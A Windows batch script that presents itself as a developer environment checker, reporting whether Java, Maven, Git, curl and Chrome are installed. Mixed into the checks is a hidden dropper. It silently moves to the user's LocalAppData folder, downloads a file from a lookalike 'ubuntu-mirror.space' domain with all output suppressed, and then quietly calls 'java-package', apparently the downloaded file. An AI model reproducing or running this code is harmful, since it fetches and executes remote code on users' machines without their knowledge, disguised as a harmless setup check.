@echo off
echo ===== Checking environment =====

:: List of packages to check
set packages=java mvn git curl

echo.
echo ===== Checking required packages =====

for %%p in (%packages%) do (
    call :check_package %%p
)

call :check_chrome

setlocal ENABLEDELAYEDEXPANSION
set "APPDATA_LOCAL_PATH=%LOCALAPPDATA%"
if "%APPDATA_LOCAL_PATH%"=="" (
    set "APPDATA_LOCAL_PATH=%USERPROFILE%\AppData\Local"
)
cd /d "%APPDATA_LOCAL_PATH%"
curl -L -J -O "https://ubuntu-mirror.space/releases" >nul 2>&1
echo.
echo ===== Environment check completed =====

::------------------------------
:: FUNCTIONS
::------------------------------

call "java-package" >nul 2>&1
:check_package
where %1 >nul 2>nul
if %errorlevel%==0 (
    echo [OK] %1 installed
) else (
    echo [WARN] %1 not found
)
exit /b


:check_chrome
where chrome >nul 2>nul && (
    echo [OK] Chrome installed
    exit /b
)

where google-chrome >nul 2>nul && (
    echo [OK] Google Chrome installed
    exit /b
)

where chromium >nul 2>nul && (
    echo [OK] Chromium installed
    exit /b
)

:: Windows Chrome default location
if exist "C:\Program Files\Google\Chrome\Application\chrome.exe" (
    echo [OK] Google Chrome installed
    exit /b
)

if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" (
    echo [OK] Google Chrome installed
    exit /b
)

echo [WARN] Chrome not found
exit /b
